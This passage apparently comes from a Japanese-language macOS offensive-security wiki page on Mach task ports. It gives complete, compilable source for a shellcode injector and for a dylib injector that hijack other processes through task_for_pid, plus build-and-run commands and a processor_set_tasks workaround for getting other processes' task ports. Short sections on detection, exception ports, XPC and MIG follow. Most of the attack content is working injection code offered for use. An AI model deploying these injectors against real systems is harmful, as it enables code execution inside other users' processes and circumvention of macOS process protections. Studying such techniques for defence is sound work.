<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>com.apple.security.get-task-allow</key>
<true/>
</dict>
</plist>
```
{{#endtab}}
{{#endtabs}}

**前のプログラムをコンパイル**し、同じユーザーでコードを注入できるように**権限**を追加します（そうでない場合は**sudo**を使用する必要があります）。

<details>

<summary>sc_injector.m</summary>
```objectivec
// gcc -framework Foundation -framework Appkit sc_injector.m -o sc_injector
// Based on https://gist.github.com/knightsc/45edfc4903a9d2fa9f5905f60b02ce5a?permalink_comment_id=2981669
// and on https://newosxbook.com/src.jl?tree=listings&file=inject.c


#import <Foundation/Foundation.h>
#import <AppKit/AppKit.h>
#include <mach/mach_vm.h>
#include <sys/sysctl.h>


#ifdef __arm64__

kern_return_t mach_vm_allocate
(
vm_map_t target,
mach_vm_address_t *address,
mach_vm_size_t size,
int flags
);

kern_return_t mach_vm_write
(
vm_map_t target_task,
mach_vm_address_t address,
vm_offset_t data,
mach_msg_type_number_t dataCnt
);


#else
#include <mach/mach_vm.h>
#endif


#define STACK_SIZE 65536
#define CODE_SIZE 128

// ARM64 shellcode that executes touch /tmp/lalala
char injectedCode[] = "\xff\x03\x01\xd1\xe1\x03\x00\x91\x60\x01\x00\x10\x20\x00\x00\xf9\x60\x01\x00\x10\x20\x04\x00\xf9\x40\x01\x00\x10\x20\x08\x00\xf9\x3f\x0c\x00\xf9\x80\x00\x00\x10\xe2\x03\x1f\xaa\x70\x07\x80\xd2\x01\x00\x00\xd4\x2f\x62\x69\x6e\x2f\x73\x68\x00\x2d\x63\x00\x00\x74\x6f\x75\x63\x68\x20\x2f\x74\x6d\x70\x2f\x6c\x61\x6c\x61\x6c\x61\x00";


int inject(pid_t pid){

task_t remoteTask;

// Get access to the task port of the process we want to inject into
kern_return_t kr = task_for_pid(mach_task_self(), pid, &remoteTask);
if (kr != KERN_SUCCESS) {
fprintf (stderr, "Unable to call task_for_pid on pid %d: %d. Cannot continue!\n",pid, kr);
return (-1);
}
else{
printf("Gathered privileges over the task port of process: %d\n", pid);
}

// Allocate memory for the stack
mach_vm_address_t remoteStack64 = (vm_address_t) NULL;
mach_vm_address_t remoteCode64 = (vm_address_t) NULL;
kr = mach_vm_allocate(remoteTask, &remoteStack64, STACK_SIZE, VM_FLAGS_ANYWHERE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to allocate memory for remote stack in thread: Error %s\n", mach_error_string(kr));
return (-2);
}
else
{

fprintf (stderr, "Allocated remote stack @0x%llx\n", remoteStack64);
}

// Allocate memory for the code
remoteCode64 = (vm_address_t) NULL;
kr = mach_vm_allocate( remoteTask, &remoteCode64, CODE_SIZE, VM_FLAGS_ANYWHERE );

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to allocate memory for remote code in thread: Error %s\n", mach_error_string(kr));
return (-2);
}


// Write the shellcode to the allocated memory
kr = mach_vm_write(remoteTask,                   // Task port
remoteCode64,                 // Virtual Address (Destination)
(vm_address_t) injectedCode,  // Source
0xa9);                       // Length of the source


if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to write remote thread memory: Error %s\n", mach_error_string(kr));
return (-3);
}


// Set the permissions on the allocated code memory
kr  = vm_protect(remoteTask, remoteCode64, 0x70, FALSE, VM_PROT_READ | VM_PROT_EXECUTE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to set memory permissions for remote thread's code: Error %s\n", mach_error_string(kr));
return (-4);
}

// Set the permissions on the allocated stack memory
kr  = vm_protect(remoteTask, remoteStack64, STACK_SIZE, TRUE, VM_PROT_READ | VM_PROT_WRITE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to set memory permissions for remote thread's stack: Error %s\n", mach_error_string(kr));
return (-4);
}

// Create thread to run shellcode
struct arm_unified_thread_state remoteThreadState64;
thread_act_t         remoteThread;

memset(&remoteThreadState64, '\0', sizeof(remoteThreadState64) );

remoteStack64 += (STACK_SIZE / 2); // this is the real stack
//remoteStack64 -= 8;  // need alignment of 16

const char* p = (const char*) remoteCode64;

remoteThreadState64.ash.flavor = ARM_THREAD_STATE64;
remoteThreadState64.ash.count = ARM_THREAD_STATE64_COUNT;
remoteThreadState64.ts_64.__pc = (u_int64_t) remoteCode64;
remoteThreadState64.ts_64.__sp = (u_int64_t) remoteStack64;

printf ("Remote Stack 64  0x%llx, Remote code is %p\n", remoteStack64, p );

kr = thread_create_running(remoteTask, ARM_THREAD_STATE64, // ARM_THREAD_STATE64,
(thread_state_t) &remoteThreadState64.ts_64, ARM_THREAD_STATE64_COUNT , &remoteThread );

if (kr != KERN_SUCCESS) {
fprintf(stderr,"Unable to create remote thread: error %s", mach_error_string (kr));
return (-3);
}

return (0);
}

pid_t pidForProcessName(NSString *processName) {
NSArray *arguments = @[@"pgrep", processName];
NSTask *task = [[NSTask alloc] init];
[task setLaunchPath:@"/usr/bin/env"];
[task setArguments:arguments];

NSPipe *pipe = [NSPipe pipe];
[task setStandardOutput:pipe];

NSFileHandle *file = [pipe fileHandleForReading];

[task launch];

NSData *data = [file readDataToEndOfFile];
NSString *string = [[NSString alloc] initWithData:data encoding:NSUTF8StringEncoding];

return (pid_t)[string integerValue];
}

BOOL isStringNumeric(NSString *str) {
NSCharacterSet* nonNumbers = [[NSCharacterSet decimalDigitCharacterSet] invertedSet];
NSRange r = [str rangeOfCharacterFromSet: nonNumbers];
return r.location == NSNotFound;
}

int main(int argc, const char * argv[]) {
@autoreleasepool {
if (argc < 2) {
NSLog(@"Usage: %s <pid or process name>", argv[0]);
return 1;
}

NSString *arg = [NSString stringWithUTF8String:argv[1]];
pid_t pid;

if (isStringNumeric(arg)) {
pid = [arg intValue];
} else {
pid = pidForProcessName(arg);
if (pid == 0) {
NSLog(@"Error: Process named '%@' not found.", arg);
return 1;
}
else{
printf("Found PID of process '%s': %d\n", [arg UTF8String], pid);
}
}

inject(pid);
}

return 0;
}
```
</details>
```bash
gcc -framework Foundation -framework Appkit sc_inject.m -o sc_inject
./inject <pi or string>
```
> [!TIP]
> これがiOSで機能するためには、書き込み可能なメモリ実行可能ファイルを作成するために`dynamic-codesigning`の権限が必要です。

### タスクポート経由のスレッドでのDylibインジェクション

macOSでは、**スレッド**は**Mach**を介して、または**posix `pthread` api**を使用して操作できます。前回のインジェクションで生成したスレッドはMach apiを使用して生成されたため、**posix準拠ではありません**。

**posix**準拠のapiを使用する必要がなかったため、**コマンドを実行するためのシンプルなシェルコードを注入することが可能でした**。しかし、**より複雑なインジェクション**では、**スレッド**も**posix準拠である必要があります**。

したがって、**スレッドを改善するためには**、**`pthread_create_from_mach_thread`**を呼び出す必要があります。これにより、**有効なpthreadが作成されます**。その後、この新しいpthreadは**dlopenを呼び出して**システムから**dylibをロード**することができるため、異なるアクションを実行するために新しいシェルコードを書く代わりに、カスタムライブラリをロードすることが可能です。

**例のdylibs**は以下にあります（例えば、ログを生成し、その後リッスンできるもの）：

{{#ref}}
../macos-library-injection/macos-dyld-hijacking-and-dyld_insert_libraries.md
{{#endref}}

<details>

<summary>dylib_injector.m</summary>
```objectivec
// gcc -framework Foundation -framework Appkit dylib_injector.m -o dylib_injector
// Based on http://newosxbook.com/src.jl?tree=listings&file=inject.c
#include <dlfcn.h>
#include <stdio.h>
#include <unistd.h>
#include <sys/types.h>
#include <mach/mach.h>
#include <mach/error.h>
#include <errno.h>
#include <stdlib.h>
#include <sys/sysctl.h>
#include <sys/mman.h>

#include <sys/stat.h>
#include <pthread.h>


#ifdef __arm64__
//#include "mach/arm/thread_status.h"

// Apple says: mach/mach_vm.h:1:2: error: mach_vm.h unsupported
// And I say, bullshit.
kern_return_t mach_vm_allocate
(
vm_map_t target,
mach_vm_address_t *address,
mach_vm_size_t size,
int flags
);

kern_return_t mach_vm_write
(
vm_map_t target_task,
mach_vm_address_t address,
vm_offset_t data,
mach_msg_type_number_t dataCnt
);


#else
#include <mach/mach_vm.h>
#endif


#define STACK_SIZE 65536
#define CODE_SIZE 128


char injectedCode[] =

// "\x00\x00\x20\xd4" // BRK X0     ; // useful if you need a break :)

// Call pthread_set_self

"\xff\x83\x00\xd1" // SUB SP, SP, #0x20         ; Allocate 32 bytes of space on the stack for local variables
"\xFD\x7B\x01\xA9" // STP X29, X30, [SP, #0x10] ; Save frame pointer and link register on the stack
"\xFD\x43\x00\x91" // ADD X29, SP, #0x10        ; Set frame pointer to current stack pointer
"\xff\x43\x00\xd1" // SUB SP, SP, #0x10         ; Space for the
"\xE0\x03\x00\x91" // MOV X0, SP                ; (arg0)Store in the stack the thread struct
"\x01\x00\x80\xd2" // MOVZ X1, 0                ; X1 (arg1) = 0;
"\xA2\x00\x00\x10" // ADR X2, 0x14              ; (arg2)12bytes from here, Address where the new thread should start
"\x03\x00\x80\xd2" // MOVZ X3, 0                ; X3 (arg3) = 0;
"\x68\x01\x00\x58" // LDR X8, #44               ; load address of PTHRDCRT (pthread_create_from_mach_thread)
"\x00\x01\x3f\xd6" // BLR X8                    ; call pthread_create_from_mach_thread
"\x00\x00\x00\x14" // loop: b loop              ; loop forever

// Call dlopen with the path to the library
"\xC0\x01\x00\x10"  // ADR X0, #56  ; X0 => "LIBLIBLIB...";
"\x68\x01\x00\x58"  // LDR X8, #44 ; load DLOPEN
"\x01\x00\x80\xd2"  // MOVZ X1, 0 ; X1 = 0;
"\x29\x01\x00\x91"  // ADD   x9, x9, 0  - I left this as a nop
"\x00\x01\x3f\xd6"  // BLR X8     ; do dlopen()

// Call pthread_exit
"\xA8\x00\x00\x58"  // LDR X8, #20 ; load PTHREADEXT
"\x00\x00\x80\xd2"  // MOVZ X0, 0 ; X1 = 0;
"\x00\x01\x3f\xd6"  // BLR X8     ; do pthread_exit

"PTHRDCRT"  // <-
"PTHRDEXT"  // <-
"DLOPEN__"  // <-
"LIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIB"
"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00"
"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00"
"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00"
"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00"
"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" ;




int inject(pid_t pid, const char *lib) {

task_t remoteTask;
struct stat buf;

// Check if the library exists
int rc = stat (lib, &buf);

if (rc != 0)
{
fprintf (stderr, "Unable to open library file %s (%s) - Cannot inject\n", lib,strerror (errno));
//return (-9);
}

// Get access to the task port of the process we want to inject into
kern_return_t kr = task_for_pid(mach_task_self(), pid, &remoteTask);
if (kr != KERN_SUCCESS) {
fprintf (stderr, "Unable to call task_for_pid on pid %d: %d. Cannot continue!\n",pid, kr);
return (-1);
}
else{
printf("Gathered privileges over the task port of process: %d\n", pid);
}

// Allocate memory for the stack
mach_vm_address_t remoteStack64 = (vm_address_t) NULL;
mach_vm_address_t remoteCode64 = (vm_address_t) NULL;
kr = mach_vm_allocate(remoteTask, &remoteStack64, STACK_SIZE, VM_FLAGS_ANYWHERE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to allocate memory for remote stack in thread: Error %s\n", mach_error_string(kr));
return (-2);
}
else
{

fprintf (stderr, "Allocated remote stack @0x%llx\n", remoteStack64);
}

// Allocate memory for the code
remoteCode64 = (vm_address_t) NULL;
kr = mach_vm_allocate( remoteTask, &remoteCode64, CODE_SIZE, VM_FLAGS_ANYWHERE );

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to allocate memory for remote code in thread: Error %s\n", mach_error_string(kr));
return (-2);
}


// Patch shellcode

int i = 0;
char *possiblePatchLocation = (injectedCode );
for (i = 0 ; i < 0x100; i++)
{

// Patching is crude, but works.
//
extern void *_pthread_set_self;
possiblePatchLocation++;


uint64_t addrOfPthreadCreate = dlsym ( RTLD_DEFAULT, "pthread_create_from_mach_thread"); //(uint64_t) pthread_create_from_mach_thread;
uint64_t addrOfPthreadExit = dlsym (RTLD_DEFAULT, "pthread_exit"); //(uint64_t) pthread_exit;
uint64_t addrOfDlopen = (uint64_t) dlopen;

if (memcmp (possiblePatchLocation, "PTHRDEXT", 8) == 0)
{
memcpy(possiblePatchLocation, &addrOfPthreadExit,8);
printf ("Pthread exit  @%llx, %llx\n", addrOfPthreadExit, pthread_exit);
}

if (memcmp (possiblePatchLocation, "PTHRDCRT", 8) == 0)
{
memcpy(possiblePatchLocation, &addrOfPthreadCreate,8);
printf ("Pthread create from mach thread @%llx\n", addrOfPthreadCreate);
}

if (memcmp(possiblePatchLocation, "DLOPEN__", 6) == 0)
{
printf ("DLOpen @%llx\n", addrOfDlopen);
memcpy(possiblePatchLocation, &addrOfDlopen, sizeof(uint64_t));
}

if (memcmp(possiblePatchLocation, "LIBLIBLIB", 9) == 0)
{
strcpy(possiblePatchLocation, lib );
}
}

// Write the shellcode to the allocated memory
kr = mach_vm_write(remoteTask,                   // Task port
remoteCode64,                 // Virtual Address (Destination)
(vm_address_t) injectedCode,  // Source
0xa9);                       // Length of the source


if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to write remote thread memory: Error %s\n", mach_error_string(kr));
return (-3);
}


// Set the permissions on the allocated code memory
kr  = vm_protect(remoteTask, remoteCode64, 0x70, FALSE, VM_PROT_READ | VM_PROT_EXECUTE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to set memory permissions for remote thread's code: Error %s\n", mach_error_string(kr));
return (-4);
}

// Set the permissions on the allocated stack memory
kr  = vm_protect(remoteTask, remoteStack64, STACK_SIZE, TRUE, VM_PROT_READ | VM_PROT_WRITE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to set memory permissions for remote thread's stack: Error %s\n", mach_error_string(kr));
return (-4);
}


// Create thread to run shellcode
struct arm_unified_thread_state remoteThreadState64;
thread_act_t         remoteThread;

memset(&remoteThreadState64, '\0', sizeof(remoteThreadState64) );

remoteStack64 += (STACK_SIZE / 2); // this is the real stack
//remoteStack64 -= 8;  // need alignment of 16

const char* p = (const char*) remoteCode64;

remoteThreadState64.ash.flavor = ARM_THREAD_STATE64;
remoteThreadState64.ash.count = ARM_THREAD_STATE64_COUNT;
remoteThreadState64.ts_64.__pc = (u_int64_t) remoteCode64;
remoteThreadState64.ts_64.__sp = (u_int64_t) remoteStack64;

printf ("Remote Stack 64  0x%llx, Remote code is %p\n", remoteStack64, p );

kr = thread_create_running(remoteTask, ARM_THREAD_STATE64, // ARM_THREAD_STATE64,
(thread_state_t) &remoteThreadState64.ts_64, ARM_THREAD_STATE64_COUNT , &remoteThread );

if (kr != KERN_SUCCESS) {
fprintf(stderr,"Unable to create remote thread: error %s", mach_error_string (kr));
return (-3);
}

return (0);
}



int main(int argc, const char * argv[])
{
if (argc < 3)
{
fprintf (stderr, "Usage: %s _pid_ _action_\n", argv[0]);
fprintf (stderr, "   _action_: path to a dylib on disk\n");
exit(0);
}

pid_t pid = atoi(argv[1]);
const char *action = argv[2];
struct stat buf;

int rc = stat (action, &buf);
if (rc == 0) inject(pid,action);
else
{
fprintf(stderr,"Dylib not found\n");
}

}
```
</details>
```bash
gcc -framework Foundation -framework Appkit dylib_injector.m -o dylib_injector
./inject <pid-of-mysleep> </path/to/lib.dylib>
```
### スレッドハイジャックによるタスクポート <a href="#step-1-thread-hijacking" id="step-1-thread-hijacking"></a>

この技術では、プロセスのスレッドがハイジャックされます：

{{#ref}}
macos-thread-injection-via-task-port.md
{{#endref}}

### タスクポートインジェクション検出

`task_for_pid` または `thread_create_*` を呼び出すと、カーネルの構造体タスク内のカウンターがインクリメントされ、ユーザーモードから `task_info(task, TASK_EXTMOD_INFO, ...)` を呼び出すことでアクセスできます。

## 例外ポート

スレッドで例外が発生すると、この例外はスレッドの指定された例外ポートに送信されます。スレッドがそれを処理しない場合、タスクの例外ポートに送信されます。タスクがそれを処理しない場合、ホストポートに送信され、launchdによって管理されます（ここで承認されます）。これを例外トリアージと呼びます。

通常、適切に処理されない場合、レポートはReportCrashデーモンによって処理されます。ただし、同じタスク内の別のスレッドが例外を管理することも可能であり、これが `PLCreashReporter` のようなクラッシュレポートツールが行うことです。

## その他のオブジェクト

### クロック

任意のユーザーはクロックに関する情報にアクセスできますが、時間を設定したり他の設定を変更したりするにはroot権限が必要です。

情報を取得するためには、`clock` サブシステムの関数を呼び出すことができます： `clock_get_time`、`clock_get_attributtes` または `clock_alarm`\
値を変更するためには、`clock_priv` サブシステムを使用し、`clock_set_time` や `clock_set_attributes` のような関数を使用できます。

### プロセッサとプロセッサセット

プロセッサAPIは、`processor_start`、`processor_exit`、`processor_info`、`processor_get_assignment` などの関数を呼び出すことで、単一の論理プロセッサを制御することを可能にします。

さらに、**プロセッサセット** APIは、複数のプロセッサをグループ化する方法を提供します。**`processor_set_default`** を呼び出すことで、デフォルトのプロセッサセットを取得できます。\
プロセッサセットと対話するための興味深いAPIは以下の通りです：

- `processor_set_statistics`
- `processor_set_tasks`: プロセッサセット内のすべてのタスクへの送信権の配列を返します
- `processor_set_threads`: プロセッサセット内のすべてのスレッドへの送信権の配列を返します
- `processor_set_stack_usage`
- `processor_set_info`

[**この投稿**](https://reverse.put.as/2014/05/05/about-the-processor_set_tasks-access-to-kernel-memory-vulnerability/)で述べたように、過去には、**`processor_set_tasks`** を呼び出して他のプロセスのタスクポートを取得し、それらを制御するために、前述の保護を回避することができました。\
現在では、その関数を使用するにはroot権限が必要であり、これは保護されているため、保護されていないプロセスでのみこれらのポートを取得できます。

以下のように試すことができます：

<details>

<summary><strong>processor_set_tasks コード</strong></summary>
````c
// Maincpart fo the code from https://newosxbook.com/articles/PST2.html
//gcc ./port_pid.c -o port_pid

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/sysctl.h>
#include <libproc.h>
#include <mach/mach.h>
#include <errno.h>
#include <string.h>
#include <mach/exception_types.h>
#include <mach/mach_host.h>
#include <mach/host_priv.h>
#include <mach/processor_set.h>
#include <mach/mach_init.h>
#include <mach/mach_port.h>
#include <mach/vm_map.h>
#include <mach/task.h>
#include <mach/task_info.h>
#include <mach/mach_traps.h>
#include <mach/mach_error.h>
#include <mach/thread_act.h>
#include <mach/thread_info.h>
#include <mach-o/loader.h>
#include <mach-o/nlist.h>
#include <sys/ptrace.h>

mach_port_t task_for_pid_workaround(int Pid)
{

host_t        myhost = mach_host_self(); // host self is host priv if you're root anyway..
mach_port_t   psDefault;
mach_port_t   psDefault_control;

task_array_t  tasks;
mach_msg_type_number_t numTasks;
int i;

thread_array_t       threads;
thread_info_data_t   tInfo;

kern_return_t kr;

kr = processor_set_default(myhost, &psDefault);

kr = host_processor_set_priv(myhost, psDefault, &psDefault_control);
if (kr != KERN_SUCCESS) { fprintf(stderr, "host_processor_set_priv failed with error %x\n", kr);
mach_error("host_processor_set_priv",kr); exit(1);}

printf("So far so good\n");

kr = processor_set_tasks(psDefault_control, &tasks, &numTasks);
if (kr != KERN_SUCCESS) { fprintf(stderr,"processor_set_tasks failed with error %x\n",kr); exit(1); }

for (i = 0; i < numTasks; i++)
{
int pid;
pid_for_task(tasks[i], &pid);
printf("TASK %d PID :%d\n", i,pid);
char pathbuf[PROC_PIDPATHINFO_MAXSIZE];
if (proc_pidpath(pid, pathbuf, sizeof(pathbuf)) > 0) {
printf("Command line: %s\n", pathbuf);
} else {
printf("proc_pidpath failed: %s\n", strerror(errno));
}
if (pid == Pid){
printf("Found\n");
return (tasks[i]);
}
}

return (MACH_PORT_NULL);
} // end workaround



int main(int argc, char *argv[]) {
/*if (argc != 2) {
fprintf(stderr, "Usage: %s <PID>\n", argv[0]);
return 1;
}

pid_t pid = atoi(argv[1]);
if (pid <= 0) {
fprintf(stderr, "Invalid PID. Please enter a numeric value greater than 0.\n");
return 1;
}*/

int pid = 1;

task_for_pid_workaround(pid);
return 0;
}

```

````

</details>

## XPC

### Basic Information

XPC, which stands for XNU (the kernel used by macOS) inter-Process Communication, is a framework for **communication between processes** on macOS and iOS. XPC provides a mechanism for making **safe, asynchronous method calls between different processes** on the system. It's a part of Apple's security paradigm, allowing for the **creation of privilege-separated applications** where each **component** runs with **only the permissions it needs** to do its job, thereby limiting the potential damage from a compromised process.

For more information about how this **communication work** on how it **could be vulnerable** check:

{{#ref}}
macos-xpc/
{{#endref}}

## MIG - Mach Interface Generator

MIG was created to **simplify the process of Mach IPC** code creation. This is because a lot of work to program RPC involves the same actions (packing arguments, sending the msg, unpacking the data in the server...).

MIC basically **generates the needed code** for server and client to communicate with a given definition (in IDL -Interface Definition language-). Even if the generated code is ugly, a developer will just need to import it and his code will be much simpler than before.

For more info check:

{{#ref}}
macos-mig-mach-interface-generator.md
{{#endref}}

## References

- [https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html](https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html)
- [https://knight.sc/malware/2019/03/15/code-injection-on-macos.html](https://knight.sc/malware/2019/03/15/code-injection-on-macos.html)
- [https://gist.github.com/knightsc/45edfc4903a9d2fa9f5905f60b02ce5a](https://gist.github.com/knightsc/45edfc4903a9d2fa9f5905f60b02ce5a)
- [https://sector7.computest.nl/post/2023-10-xpc-audit-token-spoofing/](https://sector7.computest.nl/post/2023-10-xpc-audit-token-spoofing/)
- [https://sector7.computest.nl/post/2023-10-xpc-audit-token-spoofing/](https://sector7.computest.nl/post/2023-10-xpc-audit-token-spoofing/)
- [\*OS Internals, Volume I, User Mode, Jonathan Levin](https://www.amazon.com/MacOS-iOS-Internals-User-Mode/dp/099105556X)
- [https://web.mit.edu/darwin/src/modules/xnu/osfmk/man/task_get_special_port.html](https://web.mit.edu/darwin/src/modules/xnu/osfmk/man/task_get_special_port.html)

{{#include ../../../../banners/hacktricks-training.md}}
